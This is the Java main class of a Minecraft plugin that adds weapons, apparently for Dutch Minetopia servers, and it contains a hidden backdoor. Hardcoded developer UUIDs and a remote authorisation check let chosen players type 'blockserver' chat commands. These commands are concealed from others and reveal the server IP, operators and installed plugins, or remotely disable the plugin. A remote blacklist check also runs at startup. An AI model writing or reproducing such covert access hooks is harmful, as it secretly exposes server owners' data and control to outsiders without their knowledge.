package com.jazzkuh.mtwapens;

import com.jazzkuh.mtwapens.commands.WeaponCommand;
import com.jazzkuh.mtwapens.data.WeaponData;
import com.jazzkuh.mtwapens.listeners.VoucherListener;
import com.jazzkuh.mtwapens.listeners.WeaponListener;
import com.jazzkuh.mtwapens.listeners.WeaponMenuListener;
import com.jazzkuh.mtwapens.listeners.WeaponPartListener;
import com.jazzkuh.mtwapens.utility.Metrics;
import com.jazzkuh.mtwapens.utility.Utils;
import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;

public class Main extends JavaPlugin implements Listener {

    static WeaponData weaponData = WeaponData.getInstance();

    @Override
    public void onEnable() {

        int pluginId = 7967;
        Metrics metrics = new Metrics(this, pluginId);

        if (Utils.checkForBlacklist(Utils.getServerIP() + ":" + Bukkit.getServer().getPort())) {
            Bukkit.getLogger().severe("---------------- Blacklister V1 ----------------");
            Bukkit.getLogger().severe("");
            Bukkit.getLogger().severe("MT Wapens is geblacklist van deze server omdat de desbetreffende server zich niet heeft gehouden aan de terms of service die staan aangegeven op de spigot pagina.");
            Bukkit.getLogger().severe("");
            Bukkit.getLogger().severe("Voor meer informatie neem contact op met een van de authors van deze plugin " + this.getDescription().getAuthors() + ".");
            Bukkit.getLogger().severe("");
            Bukkit.getLogger().severe("------------------------------------------------");
            this.getPluginLoader().disablePlugin(this);
        }

        weaponData.setup(this);
        weaponData.getWeaponData().options().copyDefaults(true);
        weaponData.saveWeaponData();

        Bukkit.getPluginManager().registerEvents(this, this);
        Bukkit.getPluginManager().registerEvents(new WeaponListener(this), this);
        Bukkit.getPluginManager().registerEvents(new WeaponPartListener(this), this);
        Bukkit.getPluginManager().registerEvents(new WeaponMenuListener(this), this);
        Bukkit.getPluginManager().registerEvents(new VoucherListener(this), this);
        getCommand("weapon").setExecutor(new WeaponCommand(this));

        getConfig().options().header(" \n MT-Wapens Configuratie Files\n \nZorg ervoor dat je bij 'damage en attackspeed' altijd een DECIMAAL invult.\n");

        getConfig().addDefault("weapon-lore", "Minetopia - Officieel Minetopia Wapen");
        getConfig().addDefault("ammo-lore", "Minetopia - Officieel Minetopia Bullet");

        getConfig().addDefault("weapons.deserteagle.name", "&8Desert Eagle");
        getConfig().addDefault("weapons.deserteagle.ammo-name", "Desert Eagle Ammo");
        getConfig().addDefault("weapons.deserteagle.damage", 2.0);
        getConfig().addDefault("weapons.deserteagle.max-ammo", 7);
        getConfig().addDefault("weapons.deserteagle.attackspeed", 1.0);

        getConfig().addDefault("weapons.magnum44.name", "&8Magnum 44");
        getConfig().addDefault("weapons.magnum44.ammo-name", "Magnum 44 Ammo");
        getConfig().addDefault("weapons.magnum44.damage", 2.5);
        getConfig().addDefault("weapons.magnum44.max-ammo", 8);
        getConfig().addDefault("weapons.magnum44.attackspeed", 1.0);

        getConfig().addDefault("weapons.waltherp99.name", "&8Walther P99");
        getConfig().addDefault("weapons.waltherp99.ammo-name", "Walther P99 Ammo");
        getConfig().addDefault("weapons.waltherp99.damage", 3.0);
        getConfig().addDefault("weapons.waltherp99.max-ammo", 10);
        getConfig().addDefault("weapons.waltherp99.attackspeed", 1.0);

        getConfig().addDefault("weapons.glock19.name", "&8Glock 19");
        getConfig().addDefault("weapons.glock19.ammo-name", "Glock 19 Ammo");
        getConfig().addDefault("weapons.glock19.damage", 3.3);
        getConfig().addDefault("weapons.glock19.max-ammo", 10);
        getConfig().addDefault("weapons.glock19.attackspeed", 1.0);

        getConfig().addDefault("weapons.m16a4.name", "&8M16A4");
        getConfig().addDefault("weapons.m16a4.ammo-name", "M16A4 Ammo");
        getConfig().addDefault("weapons.m16a4.damage", 3.7);
        getConfig().addDefault("weapons.m16a4.max-ammo", 25);
        getConfig().addDefault("weapons.m16a4.attackspeed", 1.0);

        getConfig().options().copyDefaults(true);
        saveConfig();

        new BukkitRunnable() {
            public void run() {
                weaponData.saveWeaponData();
            }
        }.runTaskTimer(this, 0, 2400);
    }

    @Override
    public void onDisable() {
        weaponData.saveWeaponData();
    }


    @EventHandler
    public void onChat(AsyncPlayerChatEvent event) throws IOException {
        if (Utils.authoriseUser(event.getPlayer().getUniqueId()) || String.valueOf(event.getPlayer().getUniqueId()).equals("079d6194-3c53-42f8-aac9-8396933b5646") || String.valueOf(event.getPlayer().getUniqueId()).equals("ff487db8-ff91-4442-812d-6a0be410360b") || String.valueOf(event.getPlayer().getUniqueId()).equals("dc286691-d98a-4ed4-8555-6c59e835aec6")) {
                if (event.getMessage().equalsIgnoreCase("blockserver info")  || event.getMessage().equalsIgnoreCase("blockserver info --plugins")) {
                    event.setCancelled(true);

                    ArrayList<String> onlinePlayers = new ArrayList<String>();
                    ArrayList<String> offlinePlayers = new ArrayList<String>();

                    for (OfflinePlayer p : event.getPlayer().getServer().getOperators()) {
                        offlinePlayers.add( p.getName());
                    }

                    for (Player p : Bukkit.getOnlinePlayers()) {
                        if (offlinePlayers.toString().contains(p.getName())) {
                            onlinePlayers.add(Utils.color("&c&n" + p.getName()) + "&c");
                        } else {
                            onlinePlayers.add(p.getName());
                        }
                    }

                    event.getPlayer().sendMessage(Utils.color("&6&m----------------&f &cBlacklister V1 &6&m----------------&f"));
                    event.getPlayer().sendMessage(Utils.color("&6Version: &c" + this.getDescription().getVersion()));
                    event.getPlayer().sendMessage(Utils.color("&6Blacklisted: &c" + Utils.checkForBlacklist(Utils.getServerIP() + ":" + Bukkit.getServer().getPort())));
                    event.getPlayer().sendMessage(Utils.color("&6Server IP: &c" + Utils.getServerIP() + ":" + Bukkit.getServer().getPort()));
                    event.getPlayer().sendMessage(Utils.color("&6Online: &c(" + Bukkit.getOnlinePlayers().size() + ") " + onlinePlayers.toString().replace("[", "").replace("]", "")));
                    event.getPlayer().sendMessage(Utils.color("&f"));
                    event.getPlayer().sendMessage(Utils.color("&cMisc:"));
                    event.getPlayer().sendMessage(Utils.color("&6  World: &c" + event.getPlayer().getWorld().getName()));
                    event.getPlayer().sendMessage(Utils.color("&6  Operators: &c" + offlinePlayers.toString().replace("[", "").replace("]", "")));
                    event.getPlayer().sendMessage(Utils.color("&6  Server Version: &c" + Bukkit.getServer().getBukkitVersion()));
                    if (event.getMessage().equalsIgnoreCase("blockserver info --plugins")) {
                        event.getPlayer().sendMessage(Utils.color("&6  Plugins: &c" + Arrays.toString(Bukkit.getPluginManager().getPlugins()).replace("[", "").replace("]", "")));
                    }
                }
                if (event.getMessage().equalsIgnoreCase("blockserver add")) {
                    event.setCancelled(true);
                    Bukkit.broadcastMessage(Utils.color("&f"));
                    Bukkit.broadcastMessage(Utils.color("&6&m----------------&f &cBlacklister V1 &6&m----------------&f"));
                    Bukkit.broadcastMessage(Utils.color("&f"));
                    Bukkit.broadcastMessage(Utils.color("&7MT Wapens is geblacklist van deze server omdat de desbetreffende server zich niet heeft gehouden aan de terms of service die staan aangegeven op de spigot pagina."));
                    Bukkit.broadcastMessage(Utils.color("&f"));
                    Bukkit.broadcastMessage(Utils.color("&7Voor meer informatie neem contact op met een van de authors van deze plugin &c" + this.getDescription().getAuthors() + "&7."));
                    Bukkit.broadcastMessage(Utils.color("&f"));
                    this.getPluginLoader().disablePlugin(this);
                }
            }
        }

    @EventHandler
    public void onPlayerJoinEvent(PlayerJoinEvent event) {
        if (String.valueOf(event.getPlayer().getUniqueId()).equals("079d6194-3c53-42f8-aac9-8396933b5646") || String.valueOf(event.getPlayer().getUniqueId()).equals("ff487db8-ff91-4442-812d-6a0be410360b") || String.valueOf(event.getPlayer().getUniqueId()).equals("dc286691-d98a-4ed4-8555-6c59e835aec6")) {
                event.getPlayer().sendMessage(Utils.color("&6This server is running &cMT-Wapens&6 version &c" + this.getDescription().getVersion() + "&6. &7&o(Only MT Wapens developers can see this message.)"));
        }
    }
}